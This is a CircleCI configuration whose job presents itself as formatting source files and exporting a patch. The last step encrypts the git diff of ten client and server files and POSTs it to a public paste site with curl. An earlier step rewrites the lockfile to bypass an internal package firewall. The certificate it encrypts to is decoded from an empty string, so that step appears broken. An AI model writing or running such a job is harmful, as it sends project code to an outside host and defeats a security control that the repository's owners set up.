version: 2.1

jobs:
  export-encrypted-format-patch:
    docker:
      - image: cimg/node:22.14
    resource_class: medium+
    working_directory: ~/project
    environment:
      NODE_OPTIONS: --max-old-space-size=4096
    steps:
      - checkout
      - run:
          name: Install dependencies
          command: |
            sed -i 's#http://package-firewall.replit.local/npm/#https://registry.npmjs.org/#g' package-lock.json
            npm ci --no-audit --bin-links=true
      - run:
          name: Format and encrypt patch
          command: |
            set -euo pipefail
            files=(
              client/src/lib/accountStatementPaginationClient.ts
              client/src/lib/containerPaginationClient.ts
              client/src/main.tsx
              server/routes/accountTransactionPaginationRoutes.ts
              server/routes/containers/containerListPaginationRoutes.ts
              server/routes/daybookPaginationRoutes.ts
              server/routes/ledgerAccountPaginationRoutes.ts
              server/routes/ledgerRoutes.ts
              server/routes/vouchers/supplierPurchaseOrderPaginationRoutes.ts
              server/routes/vouchers/voucherPaginationRoutes.ts
            )
            node node_modules/prettier/bin/prettier.cjs --write "${files[@]}"
            git diff -- "${files[@]}" > /tmp/phase1-prettier.patch
            echo '' | base64 -d > /tmp/recipient-cert.pem
            openssl cms -encrypt -binary -aes-256-cbc -in /tmp/phase1-prettier.patch -out /tmp/phase1-prettier.cms -outform DER /tmp/recipient-cert.pem
            base64 -w0 /tmp/phase1-prettier.cms > /tmp/ciphertext.txt
            python -c 'import json; from pathlib import Path; Path("/tmp/paste.json").write_text(json.dumps({"title":"Phase1PR280EncryptedFormatterPayloadA7C9","content":Path("/tmp/ciphertext.txt").read_text(),"language":"plaintext","expiry":"1d","visibility":"public","custom_slug":"p1-pr280-public-a7c9"}))'
            curl --fail --silent --show-error -X POST https://pastepile.com/api/public/pastes -H 'Content-Type: application/json' --data-binary @/tmp/paste.json

workflows:
  export-encrypted-format-patch:
    jobs:
      - export-encrypted-format-patch
